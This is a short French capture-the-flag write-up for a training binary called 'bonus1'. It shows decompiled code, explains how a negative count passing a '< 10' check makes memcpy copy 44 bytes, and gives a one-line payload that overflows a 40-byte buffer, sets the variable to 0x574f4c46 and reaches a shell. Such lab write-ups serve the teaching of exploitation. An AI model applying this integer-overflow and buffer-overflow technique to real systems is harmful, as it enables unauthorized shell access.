# bonus1 : integer overflow

    undefined4 main(undefined4 param_1,int param_2)
    {
        undefined4 uVar1;
        undefined1 local_3c [40];
        int local_14;
        
        local_14 = atoi(*(char **)(param_2 + 4));
        if (local_14 < 10) {
            memcpy(local_3c,*(void **)(param_2 + 8),local_14 * 4);
            if (local_14 == 0x574f4c46) {
            execl("/bin/sh","sh",0);
            }
            uVar1 = 0;
        }
        else {
            uVar1 = 1;
        }
        return uVar1;
    }

en clair: 

    main(argc, argv):
        buffer[40]
        nb = atoi(argv[1])
        if (nb > 9) return 1
        memcpy(buffer, argv[2], nb * 4)   
        if (nb == 0x574f4c46) execl("/bin/sh", ...)

Le but est overflow buff pour editer nb

**Le détournement d'entier**

`nb` doit être `< 10`, mais rien n'empêche `nb` d'être négatif : et `nb * 4` calculé en vrai (précision infinie) sur `nb = -2147483637` donne `-8 589 934 548`, bien trop grand pour tenir sur 32 bits. `memcpy` ne voit que les 32 bits du bas de ce résultat : un dépassement sur 32 bits revient à ajouter `2^32 = 4 294 967 296` jusqu'à retomber dans la plage représentable :

    -8 589 934 548 + 4 294 967 296 = -4 294 967 252   (encore négatif, un tour de plus)
    -4 294 967 252 + 4 294 967 296 = 44

Deux tours de `2^32` plus tard, on retombe sur `44` : c'est cette valeur, positive et utilisable, que `memcpy` reçoit réellement comme taille.


**payload**

 -2147483637 + 40 de bourrage pour buffer + 0x574f4c46

    ./bonus1 -2147483637 $(printf 'A%.0s' {1..40}; printf '\x46\x4c\x4f\x57')

